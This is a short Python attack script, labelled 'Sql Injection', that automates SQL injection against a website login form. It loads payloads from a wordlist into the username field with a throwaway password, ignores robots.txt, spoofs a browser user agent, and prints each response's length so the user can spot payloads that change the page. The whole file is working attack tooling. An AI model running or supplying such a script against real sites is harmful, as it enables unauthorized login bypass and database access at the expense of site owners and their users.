import mechanize
import argparse
import sys
from colorama import Fore

GREEN = Fore.GREEN
RED   = Fore.RED
WHITE = Fore.WHITE


def get_arguments():
    parser = argparse.ArgumentParser(description="Sql Injection")
    parser.add_argument('-u' , '--url' , nargs='?' , dest='url' , help= "Website URL, like : http://www.example.com/login" , required=True)
    parser.add_argument('-n' , '--name' , nargs='?' , dest='name' , help= "First input name, like username, uname..." , required=True)
    parser.add_argument('-p' , '--password' , nargs='?' , dest='password' , help= "Second input name, like password,pass..." , required=True)   
    parser.add_argument('-w', '--wordlist', nargs='?', dest='wordlist', help='Wordlist file, example: /root/wordlists/wordlist.txt', required=True)
    args = parser.parse_args()
    return args



def process(url, name, password, wordlist_location) :
    try :

        with open(wordlist_location, 'r') as wordlist :
            for line in wordlist :
                

                word = line.strip()
                request = mechanize.Browser()
                request.set_handle_robots(False)
                request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                request.open(url)
                request.select_form(nr = 0)

                request[name] = word
                request[password] = "who cares"

                response = request.submit()
                content_size = len(response.read())
                
                print(word, "          " , content_size)

            print("Finished...")

    except :
        print("\nExit")
        sys.exit()
            








result = get_arguments()
process(result.url, result.name, result.password, result.wordlist)

